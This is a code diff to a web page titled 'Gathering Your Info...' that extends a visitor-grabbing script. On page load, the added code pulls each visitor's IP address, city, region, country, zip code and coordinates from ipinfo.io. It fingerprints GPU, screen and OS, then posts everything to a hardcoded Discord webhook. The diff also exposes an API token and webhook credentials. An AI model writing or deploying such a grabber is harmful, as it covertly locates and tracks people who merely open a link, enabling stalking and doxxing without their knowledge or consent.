@@ -25,49 +25,76 @@
     <h1>Gathering Your Info...</h1>
     <div id="info">
         <p id="ip">IP Address: </p>
+        <p id="city">City: </p>
+        <p id="region">Region: </p>
+        <p id="country">Country: </p>
+        <p id="zip">Zip Code: </p>
+        <p id="latlong">Latitude, Longitude: </p>
         <p id="screen">Screen Resolution: </p>
         <p id="gpu">GPU: </p>
         <p id="os">Operating System: </p>
     </div>
 
     <script>
-        // Fetch IP address from ipinfo.io API
+        function getGPUInfo() {
+            let gl = document.createElement('canvas').getContext('webgl');
+            if (!gl) return "WebGL not supported";
+
+            let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+            return "GPU info not available";
+        }
+
+        // Fetch IP address and location info from ipinfo.io API
         fetch('https://ipinfo.io/json?token=eac37d6f8be115')
             .then(response => response.json())
             .then(data => {
-                // Display the IP address
-                const ip = data.ip;
-                document.getElementById('ip').innerHTML = "IP Address: " + ip;
+                // Extract data
+                const { ip, city, region, country, postal, loc } = data;
+                const [latitude, longitude] = loc.split(",");
                 
-                // Get screen resolution info
+                // Display collected info
+                document.getElementById('ip').innerHTML = `IP Address: ${ip}`;
+                document.getElementById('city').innerHTML = `City: ${city}`;
+                document.getElementById('region').innerHTML = `Region: ${region}`;
+                document.getElementById('country').innerHTML = `Country: ${country}`;
+                document.getElementById('zip').innerHTML = `Zip Code: ${postal}`;
+                document.getElementById('latlong').innerHTML = `Latitude, Longitude: ${latitude}, ${longitude}`;
+
+                // Get screen resolution
                 const screenWidth = window.screen.width;
                 const screenHeight = window.screen.height;
-                document.getElementById('screen').innerHTML = "Screen Resolution: " + screenWidth + "x" + screenHeight;
+                document.getElementById('screen').innerHTML = `Screen Resolution: ${screenWidth}x${screenHeight}`;
 
-                // Get GPU info (Basic info, not detailed)
-                const gpu = navigator.userAgent.includes("GPU") ? "GPU Detected" : "GPU info not available in browser";
-                document.getElementById('gpu').innerHTML = "GPU: " + gpu;
-
-                // Get OS info (like Windows, MacOS, Linux, etc.)
+                // Get OS info
                 const os = navigator.platform;
-                document.getElementById('os').innerHTML = "Operating System: " + os;
+                document.getElementById('os').innerHTML = `Operating System: ${os}`;
+                
+                // Get GPU info
+                const gpu = getGPUInfo();
+                document.getElementById('gpu').innerHTML = `GPU: ${gpu}`;
 
                 // Prepare message to send to Discord
                 const message = {
                     content: `**Device Information**\n\n` +
                              `**IP Address**: ${ip}\n` +
+                             `**City**: ${city}\n` +
+                             `**Region**: ${region}\n` +
+                             `**Country**: ${country}\n` +
+                             `**Zip Code**: ${postal}\n` +
+                             `**Latitude, Longitude**: ${latitude}, ${longitude}\n` +
                              `**Screen Resolution**: ${screenWidth}x${screenHeight}\n` +
                              `**GPU**: ${gpu}\n` +
                              `**Operating System**: ${os}\n\n` +
                              `GitHub Site: https://gordodolo.github.io/test/`
                 };
 
-                // Send the data to Discord webhook
+                // Send data to Discord webhook
                 fetch('https://discord.com/api/webhooks/1340202474971070464/dVWK9yCgV7E5M5NmFiBzBRqguEy9mwHVDxWQ2FuZ94Sl6MPUH4oe8vIgpcoWODKO1bdV', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(message)
                 })
                 .then(response => {
